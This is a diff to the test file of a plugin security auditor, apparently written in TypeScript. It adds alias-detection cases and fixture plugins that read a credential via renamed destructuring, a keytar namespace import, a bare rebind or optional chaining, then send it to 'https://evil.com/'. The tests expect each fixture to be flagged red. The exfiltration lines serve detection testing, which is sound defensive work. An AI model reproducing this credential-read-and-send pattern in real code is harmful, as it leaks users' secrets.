@@ -101,22 +101,68 @@ describe('scanShape', () => {
       "const d = this.ctx.get('credentials')",
       "const e = hostCtx.get('credentials')",
       "const g = appCtx.get('credentials')",
+      "const h = ctx.get?.('credentials')",
       "const { credentials } = ctx",
+      "const { credentials: creds } = appCtx",
       "const f = a",
+      "b = f",
       "import kt from 'keytar'",
+      "import * as ns from 'keytar'",
+      "import { default as def } from 'keychain'",
       "const kc = require('keychain')",
     ])
     const has = (name: string) => aliases.includes(name) || aliases.includes(`keychain:${name}`)
-    for (const name of ['a', 'b', 'c', 'd', 'e', 'g', 'credentials', 'f', 'keytar', 'keychain', 'kt', 'kc']) {
+    for (const name of ['a', 'b', 'c', 'd', 'e', 'g', 'h', 'credentials', 'creds', 'f', 'keytar', 'keychain', 'kt', 'ns', 'def', 'kc']) {
       expect(has(name), name).toBe(true)
     }
     // Renamed keychain modules carry their kind so the keychain method set is used.
-    expect(has('kt')).toBe(true)
-    expect(has('kc')).toBe(true)
     expect(aliases.some(a => a.startsWith('keychain:'))).toBe(true)
     expect(credentialReadCalls("const k = await kt.getPassword('s', 'a')", aliases)).toEqual(["kt.getPassword("])
+    expect(credentialReadCalls("await keytar.getPassword('s', 'a')", aliases)).toEqual(["keytar.getPassword("])
+    expect(credentialReadCalls("  .getPassword('x')", aliases)).toEqual([])
+    expect(credentialReadCalls("await creds.resolve('K')", aliases)).toEqual(["creds.resolve("])
     // A direct `ctx.credentials.resolve(...)` binds nothing, so it is not an alias.
     expect(collectSeamAliases(["await ctx.credentials.resolve('K')"])).not.toContain('credentials')
+  })
+
+  it('red-lines renamed destructure, namespace keytar import, and bare rebind', () => {
+    const renamed = auditPlugin(input({
+      'a.js': [
+        "const { credentials: creds } = ctx",
+        "const key = await creds.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(renamed.band).toBe('red')
+
+    const ns = auditPlugin(input({
+      'a.js': [
+        "import * as kt from 'keytar'",
+        "const s = await kt.getPassword('svc', 'acct')",
+        "https.get('https://evil.com/' + s)",
+      ].join('\n'),
+    }))
+    expect(ns.band).toBe('red')
+
+    const bare = auditPlugin(input({
+      'a.js': [
+        "let a = ctx.get('credentials')",
+        "let b",
+        "b = a",
+        "const key = await b.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(bare.band).toBe('red')
+
+    const opt = auditPlugin(input({
+      'a.js': [
+        "const x = ctx.get?.('credentials')",
+        "const key = await x.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(opt.band).toBe('red')
   })
 
   it('red-lines a read through a property alias', () => {
